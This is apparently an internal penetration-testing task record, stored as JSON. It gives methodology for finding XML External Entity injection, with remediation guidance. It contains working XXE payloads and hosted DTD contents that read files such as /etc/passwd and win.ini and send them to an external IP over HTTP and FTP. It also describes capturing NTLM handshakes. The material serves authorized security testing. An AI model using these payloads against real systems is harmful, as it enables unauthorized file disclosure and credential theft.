{"default_url":null,"content":{"state":3,"taskInstructions":"<h2>Instructions</h2><br>Review websites that support JSON or XML content-types. For JSON, attempt XML injections by changing JSON content-type to XML and follow the instructions in the blog below.<br><b>Reference:</b> https://blog.netspi.com/playing-content-type-xxe-json-endpoints/<br><br>Attempt to inject DOCTYPE definitions to XML-based requests (SOAP or RESTful). DOCTYPE must be defined before the XML body.<br>Reference to external entity: &amp;entity;<br>XXE can also be found in XML formatted GET and POST parameters and the same instructions can be followed to identify XXE. XXE is quite common in SAML tokens.<br><h3>Sample:</h3><br><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY<br>test SYSTEM &quot;http://www.test.com/test.txt&quot;&gt;&lt;!ELEMENT foo ANY&gt;]&gt;<br>&lt;xml start&gt;<br>..<br>&lt;foo&gt;&amp;test;&lt;/foo&gt;<br>..<br>&lt;xml ends&gt;<br></code><br>It is not necessary to define the element, external entity references can be used within existing elements.<br>If injection possible, attempt to<br><ul><li>Read local files (entity reference file:///etc/passwd or c:\\windows\\win.ini)</li><br><li>Attempt to connect back to the pentest lab environment and capture possible NTLM handshake with responder (entity reference http://&lt;pentestExternalIP&gt;/test or \\\\&lt;pentestExternalIP&gt;\\test on Windows systems)</li><br></ul><br>If outbound connectivity, external DTD can be hosted at the pentest lab.<br><h3>Sample entity injection:</h3><br><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;<br>&lt;!DOCTYPE foo SYSTEM &quot;http://&lt;pentestExternalIP&gt;/test.dtd&quot;&gt;]&gt;<br>Hosted test.dtd file content:<br>&lt;!ENTITY % payload SYSTEM &quot;file:///etc/passwd&quot;&gt;<br>&lt;!ENTITY % param1 '&lt;!ENTITY &amp;&#35;37; external SYSTEM<br>&quot;http://&lt;pentestExternalIP&gt;/x=&#35;%payload;&quot;&gt;'&gt; %param1; %external;<br></code><br>Invalid URL (x=&#35;) is used to force error messages on SAX parser. It may not be necessary. Instead, file contents may be available on .216 in Apache access logs. % is used to create parameter entities; they are used inside DOCTYPE definition rather than the XML body.<br><br>Entity injection has limited file read capabilities. XML tags and ampersands in files to be read break XML parsing and thus cannot typically be read. It may be possible to read XML files if a) outbound connectivity and b) reflection point for file read is found. I have no instructions at the moment... experiment.<br><h2><b>Reporting Requirements</b></h2><br><ol><li>Add a screenshot of the original request</li><br><li>Show the XXE injected to the request</li><br><li>Show file content enumeration or external connection to pentest lab system</li><br></ol><br><h2><b>Further Testing</b></h2><br>Test for additional findings that can be identified via XXE injection:<br><ul><li>Insufficient Egress Filtering - report if HTTP or SMB connectivity to pentest lab servers (or Collaborator)</li><br><li>Cleartext passwords in files - report if file include used to gain access to cleartext credentials</li><br><li>Excessive Privileges - Service Account - report on Windows if possible to connect to \\\\localhost\\c$\\windows\\win.ini</li><br></ul><br><h2><b>Additional Instructions</b></h2><br><h3><b>ERROR Based Injection using DTD</b></h3><br><b><i>Verification Summary</i></b><br>1. Add firewall exception for the client's IPs.<br><br>2. Inject external DTD reference that points to pentest lab servers/files.<br><br>3. Sniff incoming traffic and parse Apache logs.<br><br><b><i>Firewall Exception Details</i></b><br>The first thing you'll need to do is add an exception on the data exfiltration firewall for the client outbound IPs.  To do that follow the basic instructions below.<br>1. Log into the pentest firewall location<br><br>2. Start monitoring traffic to look for incoming traffic.<br><code>Diagnostics -&gt; Packet Capture<br></code><br>3. Initiate the XML injection.<br><br>4. Stop and review the IPs from the capture, identify the client IP, and add the IP addresses to the pentest alias.<br><code>Firewall -&gt; Aliases -&gt; Edit -&gt; + button -&gt; Add IP and Comment -&gt;Press Save -&gt; Press Apply Changes<br></code><br><h3><b>Inject External DTD Reference</b></h3><br><b><i>Below is an example request</i></b><br><code>POST /test HTTP/1.1<br>Host: someserver.test.com<br>Accept: application/json<br>Content-Type: application/xml<br>Content-Length: 137<br>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;<br>&lt;!DOCTYPE foo SYSTEM &quot;http://209.118.108.216/stest.dtd&quot;&gt;<br>&lt;root&gt;<br>&lt;search&gt;name&lt;/search&gt;<br>&lt;/root&gt;<br></code><br><b><i>Expected result example:</i></b><br><code>HTTP/1.1 500 Internal Server Error<br>Content-Type: application/xml<br>Content-Length: 2467<br>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;root&gt;<br>&lt;errors&gt;<br>&lt;errorMessage&gt;java.io.FileNotFoundException: file:///nothere/root:x:0:0:root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/bin/sh<br>bin:x:2:2:bin:/bin:/bin/sh<br>sys:x:3:3:sys:/dev:/bin/sh<br>sync:x:4:65534:sync:/bin:/bin/sync...<br></code><br><b><i>Below are different files that are currently on the netspi web server.</i></b><br><code>&lt;!DOCTYPE foo SYSTEM &quot;http://209.118.108.216/snetspi.dtd&quot;&gt;<br>content:<br>&lt;!ENTITY % payload SYSTEM &quot;file:///var/log/messages&quot;&gt;<br>&lt;!ENTITY % param1 &quot;&lt;!ENTITY &amp;&#35;37; external SYSTEM 'http://209.118.108.216/x=&#35;%payload;'&gt;&quot;&gt;%param1;%external;<br>&lt;!DOCTYPE foo SYSTEM &quot;http://209.118.108.216/snetspi2.dtd&quot;&gt;<br>content:<br>&lt;!ENTITY % payload SYSTEM &quot;file:///etc/passwd&quot;&gt;<br>&lt;!ENTITY % param1 &quot;&lt;!ENTITY &amp;&#35;37; external SYSTEM 'ftp://%payload;:aaa@209.118.108.216:443'&gt;&quot;&gt;%param1;%external;<br>&lt;!DOCTYPE foo SYSTEM &quot;http://209.118.108.216/snetspi3.dtd&quot;&gt;<br>content:<br>&lt;!ENTITY % b SYSTEM &quot;file:///etc/passwd&quot;&gt;<br>&lt;!ENTITY % c &quot;&lt;!ENTITY &amp;&#35;37; rrr SYSTEM 'ftp://209.118.108.216:443/%b;'&gt;&quot;&gt;<br>&lt;!DOCTYPE foo SYSTEM &quot;http://209.118.108.216/snetspi4.dtd&quot;&gt;<br>content:<br>&lt;!DOCTYPE drawing SYSTEM &quot;http://209.118.108.216/netspi.dtd&quot;&gt;<br>&lt;!ENTITY payload &quot;file://c:\\windows\\win.ini&quot;&gt;<br>&lt;!DOCTYPE foo SYSTEM &quot;http://209.118.108.216/snetspi5.dtd&quot;&gt;<br>content:<br>&lt;!ENTITY % payload SYSTEM &quot;file:///etc/fstab&quot;&gt;<br>&lt;!ENTITY % param1 &quot;&lt;!ENTITY &amp;&#35;37; external SYSTEM 'http://209.118.108.216/x=&#35;%payload;'&gt;&quot;&gt;%param1;%external;<br>&lt;!DOCTYPE foo SYSTEM &quot;http://209.118.108.216/snetspi6.dtd&quot;&gt;<br>content:<br>&lt;!ENTITY % payload SYSTEM &quot;file:///Program Files/Business Objects/manifest.db&quot;&gt;<br>&lt;!ENTITY % param1 &quot;&lt;!ENTITY &amp;&#35;37; external SYSTEM 'ftp://209.118.108.216:443/%payload;'&gt;&quot;&gt;%param1;%external;<br>&lt;!DOCTYPE foo SYSTEM &quot;http://209.118.108.216/snetspi7.dtd&quot;&gt;<br>content:<br>&lt;!ENTITY % payload SYSTEM &quot;file:///Documents and Settings/&quot;&gt;<br>&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;<br>&lt;!ENTITY % param1 &quot;&lt;!ENTITY &amp;&#35;37; external SYSTEM 'file:///test/%payload;'&gt;&quot;&gt;%param1;%external;<br>CDATA:<br></code><br>Injection (With inflection point):<br><code>&lt;!DOCTYPE updateProfile [<br>&lt;!ENTITY % file SYSTEM &quot;file:///test&quot;&gt;<br>&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;<br>&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;<br>&lt;!ENTITY % dtd SYSTEM &quot;http://209.118.108.216/cdata.dtd&quot;&gt;<br>%dtd;<br>]&gt;<br></code><br>On NetSPI server:<br><code>&lt;!ENTITY all &quot;%start;%file;%end;&quot;&gt;<br></code><br><h3><b>Monitoring incoming traffic</b></h3><br>1. Login into 10.2.4.11 via ssh as root or login via the vsphere client.<br>2. Montor incoming request via the Apache log with the command below.<br><code>tail -f /var/log/apache2/httpd-access.log<br></code><br>","references":[],"isTaskInstructionsVisible":true,"isCommentMandatory":false,"fields":[],"masterFinding":{"id":5050649,"exploitInstructions":"","verificationInstructions":"<b>Verification Instructions</b><br><br>Attempt to inject DOCTYPE definitions to XML-based requests (SOAP or RESTful). DOCTYPE must be defined before the XML body. Reference to external entity: &amp;entity;<br><br>XXE can also be found in XML formatted GET and POST parameters and the same instructions can be followed to identify XXE. XXE is quite common in SAML tokens.<br><br>Sample: <br><br>&lt;?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY<br>test SYSTEM \"http://www.test.com/test.txt\"&gt;&lt;!ELEMENT foo ANY&gt;]&gt;<br><br>&lt;xml start&gt;<br>..<br>&lt;foo&gt;&amp;test;&lt;/foo&gt;<br>..<br>&lt;xml ends&gt;<br><br>It is not necessary to define the element, external entity references can be used within existing elements.<br><br>If injection possible, attempt to<br><ul><li>Read local files (entity reference file:///etc/passwd or c:\\windows\\win.ini)</li><br><li>Attempt to connect back to the pentest lab environment and capture possible NTLM handshake with responder (entity reference http://&lt;pentestExternalIP&gt;/test or \\\\&lt;pentestExternalIP&gt;\\test on Windows systems)</li><br></ul><br>If outbound connectivity, external DTD can be hosted at the pentest lab.<br><br>Sample entity injection:<br><br>&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;<br> &lt;!DOCTYPE foo SYSTEM \"http://&lt;pentestExternalIP&gt;/test.dtd\"&gt;]&gt;<br><br>Hosted test.dtd file content:<br><br>&lt;!ENTITY % payload SYSTEM \"file:///etc/passwd\"&gt;<br>&lt;!ENTITY % param1 '&lt;!ENTITY &amp;&#35;37; external SYSTEM<br>\"http://&lt;pentestExternalIP&gt;/x=&#35;%payload;\"&gt;'&gt; %param1; %external;<br><br>Invalid URL (x=&#35;) is used to force error messages on SAX parser. It may not be necessary. Instead, file contents may be available on .216 in Apache access logs. % is used to create parameter entities; they are used inside DOCTYPE definition rather than the XML body.<br><br>Entity injection has limited file read capabilities. XML tags and ampersands in files to be read break XML parsing and thus cannot typically be read. It may be possible to read XML files if a) outbound connectivity and b) reflection point for file read is found. I have no instructions at the moment... experiment.<br><br><b>Reporting Requirements</b><br><ol><li>Add a screenshot of the original request</li><br><li>Show the XXE injected to the request</li><br><li>Show file content enumeration or external connection to pentest lab system</li><br></ol><br><b>Further Testing</b><br><br>Test for additional findings that can be identified via XXE injection:<br><ul><li>Insufficient Egress Filtering - report if HTTP or SMB connectivity to pentest lab servers (or Collaborator)</li><br><li>Cleartext passwords in files - report if file include used to gain access to cleartext credentials</li><br><li>Excessive Privileges - Service Account - report on Windows if possible to connect to \\\\localhost\\c$\\windows\\win.ini</li><br></ul><br><br><b>ADDITIONAL INSTRUCTIONS</b><br><br><b><u>ERROR Based Injection using DTD</u></b><br><br><br><b><i>Verification Summary</i></b><br><br>1. Add firewall exception for the client's IPs.<br>2. Inject external DTD reference that points to pentest lab servers/files.<br>4. Sniff incoming traffic and parse Apache logs.<br><br><br><b><i>Firewall Exception Details</i></b><br><br>The first thing you'll need to do is add an exception on the data exfiltration firewall for the client outbound IPs.  To do that follow the basic instructions below.<br><br>1. Log into the pentest firewall location <br><br>2. Start monitoring traffic to look for incoming traffic.<br><br>Diagnostics -&gt; Packet Capture<br><br>3. Initiate the XML injection.<br><br>4. Stop and review the IPs from the capture, identify the client IP, and add the IP addresses to the pentest alias.<br><br>Firewall -&gt; Aliases -&gt; Edit -&gt; + button -&gt; Add IP and Comment -&gt;Press Save -&gt; Press Apply Changes<br><br><br><b><u>Inject External DTD Reference</u></b><br><br><b><i>Below is an example request</i></b><br><br>POST /test HTTP/1.1<br>Host: someserver.test.com<br>Accept: application/json<br>Content-Type: application/xml<br>Content-Length: 137<br> <br>&lt;?xml version=\"1.0\" encoding=\"UTF-8\" ?&gt;<br>&lt;!DOCTYPE foo SYSTEM \"http://209.118.108.216/stest.dtd\"&gt;<br>&lt;root&gt;<br>&lt;search&gt;name&lt;/search&gt;<br>&lt;/root&gt;<br><br><b><i>Expected result example:</i></b><br><br>HTTP/1.1 500 Internal Server Error<br>Content-Type: application/xml<br>Content-Length: 2467<br> <br>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;root&gt;<br>&lt;errors&gt;<br>&lt;errorMessage&gt;java.io.FileNotFoundException: file:///nothere/root:x:0:0:root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/bin/sh<br>bin:x:2:2:bin:/bin:/bin/sh<br>sys:x:3:3:sys:/dev:/bin/sh<br>sync:x:4:65534:sync:/bin:/bin/sync...<br><br><br><b><i>Below are different files that are currently on the netspi web server.</i></b><br><br>&lt;!DOCTYPE foo SYSTEM \"http://209.118.108.216/snetspi.dtd\"&gt;<br><br>content:<br><br>&lt;!ENTITY % payload SYSTEM \"file:///var/log/messages\"&gt;<br>&lt;!ENTITY % param1 \"&lt;!ENTITY &amp;&#35;37; external SYSTEM 'http://209.118.108.216/x=&#35;%payload;'&gt;\"&gt;%param1;%external;<br><br><br>&lt;!DOCTYPE foo SYSTEM \"http://209.118.108.216/snetspi2.dtd\"&gt;<br><br>content:<br><br>&lt;!ENTITY % payload SYSTEM \"file:///etc/passwd\"&gt;<br>&lt;!ENTITY % param1 \"&lt;!ENTITY &amp;&#35;37; external SYSTEM 'ftp://%payload;:aaa@209.118.108.216:443'&gt;\"&gt;%param1;%external;<br><br><br>&lt;!DOCTYPE foo SYSTEM \"http://209.118.108.216/snetspi3.dtd\"&gt;<br><br>content:<br><br>&lt;!ENTITY % b SYSTEM \"file:///etc/passwd\"&gt;<br>&lt;!ENTITY % c \"&lt;!ENTITY &amp;&#35;37; rrr SYSTEM 'ftp://209.118.108.216:443/%b;'&gt;\"&gt;<br><br><br>&lt;!DOCTYPE foo SYSTEM \"http://209.118.108.216/snetspi4.dtd\"&gt;<br><br>content:<br><br>&lt;!DOCTYPE drawing SYSTEM \"http://209.118.108.216/netspi.dtd\"&gt;<br>&lt;!ENTITY payload \"file://c:\\windows\\win.ini\"&gt; <br><br><br>&lt;!DOCTYPE foo SYSTEM \"http://209.118.108.216/snetspi5.dtd\"&gt;<br><br>content:<br><br>&lt;!ENTITY % payload SYSTEM \"file:///etc/fstab\"&gt;<br>&lt;!ENTITY % param1 \"&lt;!ENTITY &amp;&#35;37; external SYSTEM 'http://209.118.108.216/x=&#35;%payload;'&gt;\"&gt;%param1;%external;<br><br><br>&lt;!DOCTYPE foo SYSTEM \"http://209.118.108.216/snetspi6.dtd\"&gt;<br><br>content:<br><br>&lt;!ENTITY % payload SYSTEM \"file:///Program Files/Business Objects/manifest.db\"&gt;<br>&lt;!ENTITY % param1 \"&lt;!ENTITY &amp;&#35;37; external SYSTEM 'ftp://209.118.108.216:443/%payload;'&gt;\"&gt;%param1;%external;<br><br><br>&lt;!DOCTYPE foo SYSTEM \"http://209.118.108.216/snetspi7.dtd\"&gt;<br><br>content:<br><br>&lt;!ENTITY % payload SYSTEM \"file:///Documents and Settings/\"&gt;<br>&lt;!ENTITY % end \"]]&gt;\"&gt;<br>&lt;!ENTITY % param1 \"&lt;!ENTITY &amp;&#35;37; external SYSTEM 'file:///test/%payload;'&gt;\"&gt;%param1;%external;<br><br>CDATA:<br><br>Injection (With inflection point):<br><br>&lt;!DOCTYPE updateProfile [<br> &lt;!ENTITY % file SYSTEM \"file:///test\"&gt;<br> &lt;!ENTITY % start \"&lt;![CDATA[\"&gt;<br> &lt;!ENTITY % end \"]]&gt;\"&gt;<br> &lt;!ENTITY % dtd SYSTEM \"http://209.118.108.216/cdata.dtd\"&gt;<br>%dtd;<br>]&gt;<br><br>On NetSPI server:<br><br>&lt;!ENTITY all \"%start;%file;%end;\"&gt;<br><br><br><b><i>Monitoring incoming traffic</i></b><br><br>1. Login into 10.2.4.11 via ssh as root or login via the vsphere client.<br>2. Montor incoming request via the Apache log with the command below.<br><br>tail -f /var/log/apache2/httpd-access.log<br>","remediationInstructions":"Consider all XML input as untrusted, and thus prohibit all external entity references and inline DOCTYPE definitions.<br>","name":"XML External Entity Injection","sourceId":"M:392f499a-411d-e211-b92d-001e4f120032","severity":"High","businessImpact":"Successful exploitation of the vulnerability may allow an unauthorized user to read arbitrary files on the affected system, resulting in the compromise of confidentiality. Exploitation may lead to disclosure of confidential information, as well as reveal sensitive information that can be used in further attacks against the target system.","description":"External Entities and external document type definitions allow referencing resources outside the main file into an XML document. When an XML processor recognizes a reference to an external entity to validate the document, it may include the entity's replacement text.  Attacks targeting this behavior are commonly referred to as XML External Entity (XXE) attacks.<br><br>An attacker could, by including user-controlled external entity in the XML request:<br><ul><li>Force the XML processor to read arbitrary files on the remote system</li><br><li>Force the XML processor to connect to external systems</li><br><li>Craft a malicious XML bomb with nested entities to consume server's resources, causing Denial of Service conditions</li><br></ul><br>"}}}